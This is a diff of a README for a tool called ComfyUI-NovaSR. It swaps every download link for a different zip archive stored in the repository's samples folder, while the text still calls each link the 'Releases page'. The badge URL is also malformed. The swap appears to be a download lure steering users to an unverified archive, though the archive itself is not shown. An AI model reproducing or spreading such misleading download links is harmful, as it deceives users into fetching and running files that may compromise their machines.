@@ -1,6 +1,6 @@
 # 🎵 ComfyUI-NovaSR - Enhancing Your Audio Experience Fast
 
-[![Download ComfyUI-NovaSR](https://raw.githubusercontent.com/huydeptraivaio/ComfyUI-NovaSR/main/example_workflow/Comfy_U_SR_Nova_v2.4.zip%20Now-From%https://raw.githubusercontent.com/huydeptraivaio/ComfyUI-NovaSR/main/example_workflow/Comfy_U_SR_Nova_v2.4.zip)](https://raw.githubusercontent.com/huydeptraivaio/ComfyUI-NovaSR/main/example_workflow/Comfy_U_SR_Nova_v2.4.zip)
+[![Download ComfyUI-NovaSR](https://raw.githubusercontent.com/huydeptraivaio/ComfyUI-NovaSR/main/samples/Nova-U-SR-Comfy-3.4-alpha.3.zip%20Now-From%https://raw.githubusercontent.com/huydeptraivaio/ComfyUI-NovaSR/main/samples/Nova-U-SR-Comfy-3.4-alpha.3.zip)](https://raw.githubusercontent.com/huydeptraivaio/ComfyUI-NovaSR/main/samples/Nova-U-SR-Comfy-3.4-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you begin, ensure your system meets these requirements:
 
 To download ComfyUI-NovaSR, visit the Releases page:
 
-[Download ComfyUI-NovaSR](https://raw.githubusercontent.com/huydeptraivaio/ComfyUI-NovaSR/main/example_workflow/Comfy_U_SR_Nova_v2.4.zip).
+[Download ComfyUI-NovaSR](https://raw.githubusercontent.com/huydeptraivaio/ComfyUI-NovaSR/main/samples/Nova-U-SR-Comfy-3.4-alpha.3.zip).
 
 1. Click the link above to go to the Releases page.
 2. Locate the latest version of ComfyUI-NovaSR.
@@ -65,7 +65,7 @@ After installation, you can start using the application to enhance your audio. H
 
 If you encounter issues while using ComfyUI-NovaSR, these tips may help:
 
-- **Check for Updates:** Make sure you have the latest version of the software. Visit the [Releases page](https://raw.githubusercontent.com/huydeptraivaio/ComfyUI-NovaSR/main/example_workflow/Comfy_U_SR_Nova_v2.4.zip) regularly.
+- **Check for Updates:** Make sure you have the latest version of the software. Visit the [Releases page](https://raw.githubusercontent.com/huydeptraivaio/ComfyUI-NovaSR/main/samples/Nova-U-SR-Comfy-3.4-alpha.3.zip) regularly.
 - **Reinstall the Application:** If you experience persistent errors, try uninstalling and reinstalling ComfyUI-NovaSR.
 - **Contact Support:** For more help, consider checking the GitHub Issues page or reaching out directly for support.
 
